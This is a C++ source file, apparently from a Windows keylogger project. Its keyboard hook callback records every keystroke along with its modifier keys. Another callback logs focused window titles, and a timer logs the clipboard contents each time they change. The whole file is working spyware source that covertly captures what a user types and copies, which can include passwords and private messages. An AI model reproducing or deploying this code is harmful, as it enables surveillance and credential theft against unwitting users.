#include "Keylogger.h"

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        PKBDLLHOOKSTRUCT keyEvent = (PKBDLLHOOKSTRUCT)lParam;
        BYTE keyboardState[256];
        HKL keyboardLayout = GetKeyboardLayout(0);
        WCHAR key[8];
        char buffer[256];
        char* ptr = buffer;
        int ret;
        
        memset(keyboardState, 0, sizeof(keyboardState));
        memset(key, 0, sizeof(key));
        memset(buffer, 0, sizeof(buffer));

        GetKeyState(0);
        (void)GetKeyboardState(keyboardState);


        if (memcmp(winkey_g.hwndPrevFocusedWindow, winkey_g.hwndFocusedWindow, 256))
            logWindowChange();

        if ((keyboardState[VK_SHIFT] & 0x80) && (keyEvent->vkCode >= 'A' && keyEvent->vkCode <= 'Z'))
        {
            memcpy(ptr, "Shift", 5);
            ptr += 5;
        }
        if (keyboardState[VK_CONTROL] & 0x80)
        {
            memcpy(ptr, "Ctrl", 4);
            ptr += 4;
            keyboardState[VK_CONTROL] = 0;
            if (keyEvent->vkCode >= 'A' && keyEvent->vkCode <= 'Z')
                keyboardState[VK_SHIFT] = 128;
        }
        if (keyboardState[VK_MENU] & 0x80)
        {
            memcpy(ptr, "Alt", 3);
            ptr += 3;
            keyboardState[VK_MENU] = 0;
            if (keyEvent->vkCode >= 'A' && keyEvent->vkCode <= 'Z')
                keyboardState[VK_SHIFT] = 128;
        }
        if (keyboardState[VK_LWIN] & 0x80 || keyboardState[VK_RWIN] & 0x80)
        {
            memcpy(ptr, "Win", 3);
            ptr += 3;
            if (keyEvent->vkCode >= 'A' && keyEvent->vkCode <= 'Z')
                keyboardState[VK_SHIFT] = 128;
        }

        switch (keyEvent->vkCode)
        {
        case VK_BACK:
            logInput((char*)"[Del]");
            break;
        case VK_TAB:
            logInput((char*)"[Tab]");
            break;
        case VK_CAPITAL:
            logInput((char*)"[CapsLock]");
            break;
        case VK_RIGHT:
            logInput((char*)"[RightArrow]");
            break;
        case VK_DOWN:
            logInput((char*)"[DownArrow]");
            break;
        case VK_UP:
            logInput((char*)"[UpArrow]");
            break;
        case VK_LEFT:
            logInput((char*)"[LeftArrow]");
            break;
        case VK_RETURN:
            logInput((char*)"\\n");
            winkey_g.nl = true;
            [[fallthrough]];
        default:
            if ((ret = ToUnicodeEx(keyEvent->vkCode, keyEvent->scanCode, keyboardState, key, 7, 0, keyboardLayout)) > 0)
            {
                if (keyEvent->vkCode != VK_RETURN)
                    winkey_g.nl = false;
                key[ret] = 0;
                size_t  n = 0;
                wcstombs_s(&n, ptr, (size_t)((buffer - ptr) + 256), key, (size_t)7);
                buffer[255 - ((buffer - ptr) + 256 - n)] = 0;

                logInput(buffer);
            }
            break;
        }
    }

    return (CallNextHookEx(winkey_g.keyboardHook, code, wParam, lParam));
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{ 
    (void)hWinEventHook; (void)event; (void)hwnd; (void)idChild; (void)idObject; 
    (void)dwEventThread; (void)dwmsEventTime;
    GetWindowTextA(hwnd, winkey_g.hwndFocusedWindow, 256);
}

void CALLBACK TimerCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
    (void)hwnd; (void)uMsg; (void)idEvent; (void)dwTime;
    std::string clipboardText = clipboardChanged();
    if (winkey_g.prevClipBoard != clipboardText)
    {
        logClipboard(clipboardText);
        winkey_g.prevClipBoard = clipboardText;
    }
}